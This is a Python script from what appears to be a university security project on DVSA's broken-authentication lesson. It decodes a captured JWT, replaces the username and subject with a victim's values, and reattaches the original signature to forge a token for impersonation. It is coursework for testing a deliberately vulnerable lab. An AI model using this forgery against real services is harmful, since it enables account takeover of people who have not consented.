import base64
import json

"""
ICS344 DVSA Security Project
Lesson 2 - Broken Authentication

This script demonstrates how a JWT payload can be decoded and modified
for documentation/testing purposes in the Broken Authentication lesson.
"""

TOKEN_B = "USER_B_TOKEN_HERE"

# Replace these with User C values from your captured token/payload
VICTIM_USERNAME = "USER_C_USERNAME_HERE"
VICTIM_SUB = "USER_C_SUB_HERE"


def b64url_decode(data):
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)


def b64url_encode(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


print("=" * 70)
print("Lesson 2 - Broken Authentication JWT Payload Test")
print("=" * 70)

try:
    header_b64, payload_b64, signature_b64 = TOKEN_B.split(".")

    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))

    print("[1] Original JWT payload:")
    print(json.dumps(payload, indent=4))

    payload["username"] = VICTIM_USERNAME
    payload["sub"] = VICTIM_SUB

    new_payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    forged_token = header_b64 + "." + new_payload_b64 + "." + signature_b64

    print("\n[2] Modified JWT payload:")
    print(json.dumps(payload, indent=4))

    print("\n[3] Forged token:")
    print(forged_token)

    print("\n[!] In the vulnerable version, the backend may accept this forged token.")
    print("[+] After the fix, the backend should reject it with invalid token.")

except ValueError:
    print("[ERROR] Invalid JWT format. Make sure TOKEN_B has three parts separated by dots.")
except Exception as error:
    print("[ERROR] Failed to process token:")
    print(error)